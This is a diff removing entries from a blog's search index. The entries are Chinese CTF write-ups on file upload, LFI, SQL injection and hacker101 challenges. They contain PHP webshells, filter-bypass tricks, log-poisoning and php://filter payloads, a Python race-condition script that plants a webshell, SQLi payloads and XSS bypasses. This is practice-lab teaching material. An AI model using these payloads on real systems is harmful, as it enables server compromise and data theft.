@@ -1,404 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello world!</title>
-    <url>/2022/01/16/blog0000-hello-world/</url>
-    <content><![CDATA[<h2 id="写在前面的一些话"><a href="#写在前面的一些话" class="headerlink" title="写在前面的一些话"></a>写在前面的一些话</h2><p>Welcome to my blog!</p>
-<span id="more"></span>
-<p>这里是whistleH的博客世界，开这个博客的最初目的是大一暑假学的东西太多太杂，希望自己搭一个博客来记录一下自己学习历程。</p>
-]]></content>
-      <tags>
-        <tag>preface</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow-upload-wp</title>
-    <url>/2022/04/11/blog0012-ctfshow-upload-wp/</url>
-    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>文件上传开始</p>
-<span id="more"></span>
-<h3 id="web151（绕过前端校验）"><a href="#web151（绕过前端校验）" class="headerlink" title="web151（绕过前端校验）"></a>web151（绕过前端校验）</h3><p>前端校验要求传入的图片格式为<code>png</code></p>
-<p>将<code>php</code>文件修改后缀为<code>png</code>，抓包重放修改为<code>php</code></p>
-<p>蚁剑连接，成功打通</p>
-<h3 id="web152"><a href="#web152" class="headerlink" title="web152"></a>web152</h3><p>同web151</p>
-<h3 id="web153（-user-ini）"><a href="#web153（-user-ini）" class="headerlink" title="web153（.user.ini）"></a>web153（.user.ini）</h3><p>首先是ban了<code>php</code>，爆破常见后缀名之后，发现基本都无法解析。</p>
-<p>考虑上传<code>.user.ini</code>，然后先检查一下<code>upload</code>目录下是否存在PHP文件，发现存在PHP文件，于是上传两个文件。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//.user.ini</span></span><br><span class="line">auto_append_file=<span class="number">1</span>.png</span><br><span class="line">    </span><br><span class="line"><span class="comment">//1.png</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);highlight_file(<span class="keyword">__FILE__</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传文件之后，访问同目录下的php文件，实现了文件包含漏洞。</p>
-<h3 id="web154（文件内容校验）"><a href="#web154（文件内容校验）" class="headerlink" title="web154（文件内容校验）"></a>web154（文件内容校验）</h3><p>这道题在web153的基础上，对文件内容进行校验。关于PHP的一句话木马，我们往往有几种类似的表达。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//开启short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]); <span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//不需要开启参数</span></span><br><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//低于7.0的版本</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//低于7.0的版本且开启asp_tags=on</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;</span><br></pre></td></tr></table></figure>
-<p>这道题我们直接选择第三种表达，剩下的步骤和web153一样。</p>
-<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>同web154</p>
-<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>过滤了[]，修改一句话木马为</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>&#123;<span class="number">1</span>&#125;);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>增加过滤了分号和<code>&#123;&#125;</code></p>
-<p>直接一句话读吧，ctfshow经典绕过各种过滤，有点小难受。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>system(<span class="string">&#x27;tac ../f*&#x27;</span>)<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?=</span>`tac ../f*`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>同web157，一把过。</p>
-<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>同web157</p>
-<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>这道题还是基于上面<code>.user.ini</code>的攻击思路，但是也需要类似逃逸的思路。</p>
-<p>首先描述一下攻击思路：</p>
-<p><strong>.user.ini（文件包含）—&gt; 上传1.png（rce，可控）—&gt; /upload/index.php 攻击</strong></p>
-<p>但是当我们对文件内容进行较为严格的过滤时，我们可以考虑在<code>1.png</code>时继续文件包含，将<code>rce</code>的内容转移到新的文件中，于是我们重写<code>1.png</code>文件上传的内容。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">include</span><span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/n&#x27;</span>.<span class="string">&#x27;ginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>在日志中写入我们的一句话木马，成功实现<code>rce</code>。</p>
-<h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3>]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>upload</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>wp</tag>
-        <tag>upload</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ctfshow-LFI-wp</title>
-    <url>/2022/04/10/blog0011-ctfshow-LFI-wp/</url>
-    <content><![CDATA[<h2 id="一、写在前面"><a href="#一、写在前面" class="headerlink" title="一、写在前面"></a>一、写在前面</h2><p>LFI应该是接触很久的漏洞了，这次来补一下ctfshow的wp。</p>
-<span id="more"></span>
-<h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>PHP伪协议</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<h3 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h3><p>继续PHP伪协议</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=</span><br></pre></td></tr></table></figure>
-<h3 id="web80、web81"><a href="#web80、web81" class="headerlink" title="web80、web81"></a>web80、web81</h3><p>日志包含，在http报文中写入一句话木马</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(cmd);highlight_file(<span class="keyword">__FILE__</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>然后日志包含</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-<h3 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h3><p>session包含+条件竞争，主要是利用PHP在上传文件中，会在<code>/tmp/sess_&#123;sessionid&#125;</code>临时文件下，写入<code>PHP_SESSION_UPLOAD_PROGRESS</code>对应的内容，这样就实现了RCE。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://ea1277ef-6dd0-4b65-9d85-c0b0e216a679.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/2.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#&lt;?php eval($_POST[1]);?&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;2.php&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>看看漏洞出现的代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里题目中有<code>urldecode</code>，因此我们可以两次<code>url</code>编码绕过。</p>
-<p><code>file_put_contents</code>，我们可以利用<code>php</code>伪协议</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=string.rot13/resource=1.php</span><br></pre></td></tr></table></figure>
-<p>这个协议的意思是我们将内容按<code>rot13</code>编码写入<code>1.php</code>文件,，这样我们就可以将语句中的<code>die</code>语句被处理，同时将我们要写入的内容按<code>rot13</code>编码写入（两次<code>rot13</code>就会回到最初的代码），最后成功绕过。</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>cuc @riny(<span class="variable">$_CBFG</span>[<span class="number">1</span>]);uvtuyvtug_svyr(__SVYR__); <span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> @eval($_POST[1]);highlight_file(__FILE__);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><p>先看漏洞成因代码：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里我们观察发现，没有ban引号和斜杠，那我们考虑使用data伪协议来实现文件包含，不过这里还是ban了<code>=</code>和<code>+</code>，这里对于构造的payload比较麻烦，这里分享一个trick：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对于PHP,base64_decode()会自动填充末尾的=</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg&quot;</span>).<span class="string">&quot;\n&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_decode(<span class="string">&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg=&quot;</span>).<span class="string">&quot;\n&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>所以后面的事情就很简单了，不再说明了。</p>
-<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>打开以后是一个视频，我们下载下来，然后提取出其中的PNG图片，直接抓包重放解决问题。</p>
-<h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><p>先看漏洞成因代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;</span>,<span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$contents</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;contents&#x27;</span>];</span><br><span class="line">filter(<span class="variable">$file</span>);</span><br><span class="line">file_put_contents(<span class="variable">$file</span>, <span class="string">&quot;&lt;?php die();?&gt;&quot;</span>.<span class="variable">$contents</span>);</span><br></pre></td></tr></table></figure>
-<p>还是写入文件，绕过死亡die的一个套路，但是这道题我们的rot13被ban掉了，因此我们需要引入新的编码方式，这里参考了一下羽师傅的payload。</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br></pre></td></tr></table></figure>
-<p>这里利用了一个<code>UCS-2LE.UCS-2BE</code>的编码方式，将相邻的两个字符交换位置。</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">content=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br></pre></td></tr></table></figure>
-<p>这样就成功写入文件。</p>
-<p>PHP支持的更多编码方式:</p>
-<p><a href="https://www.php.net/manual/zh/mbstring.supported-encodings.php">https://www.php.net/manual/zh/mbstring.supported-encodings.php</a></p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>LFI</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>ctfshow</tag>
-        <tag>wp</tag>
-        <tag>LFI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入笔记</title>
-    <url>/2022/03/31/blog0002-SQL%E6%B3%A8%E5%85%A5%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="一、联合注入"><a href="#一、联合注入" class="headerlink" title="一、联合注入"></a>一、联合注入</h2><h3 id="1、基本说明"><a href="#1、基本说明" class="headerlink" title="1、基本说明"></a>1、基本说明</h3><p>SQL注入中最经典的就是联合查询，先上经典三板斧</p>
-<p>联合注入的手段还是很多的，但是都大同小异，主要还是从information_schema这个存放mysql信息的数据库下手。</p>
-<span id="more"></span>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;&#123;database_name&#125;&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆破内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,&#123;column_name&#125;,<span class="number">0x5c</span>,&#123;colunm_name&#125;) <span class="keyword">from</span> &#123;database_name&#125;.&#123;table_name&#125;);</span><br><span class="line"># 注意， 爆破内容时我们要考虑引号的问题</span><br><span class="line"># 补一个爆破内容的例子：</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, <span class="number">2</span>, (<span class="keyword">select</span> group_concat(<span class="number">0x5c</span>,id,<span class="number">0x5c</span>,name) <span class="keyword">from</span> whistle.user);</span><br></pre></td></tr></table></figure>
-<p>联合查询是入门的SQL注入姿势，通常只有面对没有部署任何waf的Web才能奏效。</p>
-<h3 id="2、补充"><a href="#2、补充" class="headerlink" title="2、补充"></a>2、补充</h3><p>在联合查询时，我们构造payload要注意让前一个查询语句没有查询结果。</p>
-<p>这是在实际情况中，往往Web只会显示查询到的第一条信息，</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> ......</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span> <span class="keyword">union</span></span><br></pre></td></tr></table></figure>
-<p>这里我们可以清楚发现前者屏蔽了正常查询的结果，使得我们的payload注入结果能够正常显示。</p>
-<h2 id="二、堆叠注入"><a href="#二、堆叠注入" class="headerlink" title="二、堆叠注入"></a>二、堆叠注入</h2><h3 id="1、说明"><a href="#1、说明" class="headerlink" title="1、说明"></a>1、说明</h3><p>堆叠注入的经典案例就是强网杯2019的“随便注”（XCTF和BUUOJ都有环境复现</p>
-<p>大致的原理和RCE中的管道运算符注入一样。</p>
-<h3 id="2、补充-1"><a href="#2、补充-1" class="headerlink" title="2、补充"></a>2、补充</h3><p>先上”随便注”的payload</p>
-<p>这里过滤了select 和 prepare，后者大小写非常好绕过（不用正则还是太年轻</p>
-<p>前者我们这里使用了设置变量的方法，成功绕过了select的注入问题</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span><span class="operator">=</span>concat(<span class="string">&#x27;sel&#x27;</span>,<span class="string">&#x27;ect * from `1919810931114514`&#x27;</span>);<span class="keyword">Prepare</span> uut <span class="keyword">from</span> <span class="variable">@sql</span>; <span class="keyword">execute</span> uut;  <span class="comment">-- - </span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>sql</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL语法笔记</title>
-    <url>/2022/03/31/blog0010-SQL%E8%AF%AD%E6%B3%95%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h2 id="零、基础知识"><a href="#零、基础知识" class="headerlink" title="零、基础知识"></a>零、基础知识</h2><p>1、<strong>数据类型</strong></p>
-<p>首先我们要了解SQL语句的基本数据类型。</p>
-<p>具体的知识我们可以参考w3cschools : </p>
-<span id="more"></span>
-<p><strong>2、注释</strong></p>
-<p>SQL注入中我们常常需要借助注释的力量。</p>
-<p>常见的注释方法有:</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th style="text-align:center">/<em> </em>/</th>
-<th style="text-align:center">多行注释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">—</td>
-<td style="text-align:center">行末注释</td>
-</tr>
-<tr>
-<td style="text-align:center">#</td>
-<td style="text-align:center">行末注释（mysql独有的注释符号）</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><strong>3、表的基本操作</strong></p>
-<p>表的操作有增删查改。</p>
-<h2 id="一、数据查询"><a href="#一、数据查询" class="headerlink" title="一、数据查询"></a>一、数据查询</h2><p>不论是何种数据库，设计的意义都是为了方便查询，这也是SQL语法标准的意义所在。对于SQL注入而言，我们主要关心的就是数据的查询。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 常见的格式如下 */</span><br><span class="line">select * from &#123;table_name&#125; where &#123;limit&#125;</span><br></pre></td></tr></table></figure>
-<p>重要关键词如下：</p>
-<p><code>DISTINCT</code>    : 将返回结果去重</p>
-<p><code>in</code>                 ：SQL注入中可以替代<code>=</code>使用，bypass的点</p>
-<p><code>比较运算符</code>   ：SQL语法中，字符串也可以进行比较（从左向右，根据ASCII码比较）    </p>
-<p><code>LIKE</code>            ：字段条件匹配</p>
-<p>​                          通配符：%  —&gt;    匹配任意字符  </p>
-<p>​                                          _    —&gt;    匹配任意一位字符</p>
-<p><code>order by</code>    ：排序关键字</p>
-<ul>
-<li>order by (id/列的索引)</li>
-<li>（默认升序， DESC 表示降序）</li>
-</ul>
-<p><code>limit</code>            :  限制筛选输出的行数，在SQL server中，使用top 来代替</p>
-<p><code>alias</code>            :  重命名，常用作as，也可以空格代替</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> id <span class="keyword">as</span> whistleh <span class="keyword">from</span> table_user <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> id whistleh	<span class="keyword">from</span> table_user <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)s</span><br></pre></td></tr></table></figure>
-<h2 id="二、函数使用"><a href="#二、函数使用" class="headerlink" title="二、函数使用"></a>二、函数使用</h2><p>SQL语法自带一定的函数，当然在mysql,oracle等等具体的SQL语言中，也会有特定的函数。</p>
-<p><code>min</code>,<code>max</code>,<code>sum</code>,<code>count</code>,<code>avg</code>等都是常见的函数</p>
-<p><code>database</code>    :    输出当前数据库</p>
-<p><code>user</code>            :    输出当前用户        </p>
-<p><code>sleep</code>    :    常用在时间盲注当中</p>
-<p><code>updatexml</code>    :    可以用在报错注入，测试后端是否存在注入点</p>
-<p><code>contact</code>        :    连接字符串，支持ASCII编码</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> contact(<span class="number">0x7e</span>,database(),<span class="number">0x7e</span>,@<span class="variable">@datadir</span>);</span><br></pre></td></tr></table></figure>
-<h2 id="三、内置变量"><a href="#三、内置变量" class="headerlink" title="三、内置变量"></a>三、内置变量</h2><p><code>datadir</code>    :    数据库的系统目录</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@datadir</span>;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>数据库</category>
-        <category>sql</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>sql</tag>
-        <tag>数据库</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hacker101系列wp（持续更新中）</title>
-    <url>/2022/03/29/blog0009-hacker101%E7%B3%BB%E5%88%97wp%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="一、Micro-CMS-v1"><a href="#一、Micro-CMS-v1" class="headerlink" title="一、Micro-CMS v1"></a>一、Micro-CMS v1</h2><p>这道题有4个flag，我们逐个分解。</p>
-<span id="more"></span>
-<p>首先一进来，页面异常简洁，直接Ctrl+U，观察一下全局，url中page带数字。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_1.png" alt=""></p>
-<p>其实一般来说page含数字的，我们可以考虑一下是不是有文件包含（include）或者注入点（查询）。</p>
-<p>我们尝试url注入，在page处加上一个引号封闭一下，果然弹出来第一个flag。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://19d516b0310286729dd8449820bfdb6f.ctf.hacker101.com/page/edit/1&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_2.png" alt=""></p>
-<p>接下来，我们进入test页面，发现这里留了一个留言板，非常有XSS的暗示性，我们直接上手来一个</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0009/blog0009_3.png" alt=""></p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-<p>有意思的是，这个留言板在后端显然把script过滤了，但是这个过滤还是太年轻了，我们尝试换种思路注入</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;buttun onclick=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><br></pre></td></tr></table></figure>
-<p>同理，我们也可以在标题框注入，这样得到了两个flag。</p>
-<p>那么最后一个flag在哪里？我们这时候尝试创建一个新的留言板。</p>
-<p>进入之后观察，发现新的界面的page跳过3-7，怀疑一下其中有猫腻，于是bp爆破，发现其中一个返回405，其他都是404，进入edit页面之后，访问得到最后一个flag</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>web</category>
-        <category>wp</category>
-        <category>comprehensive</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
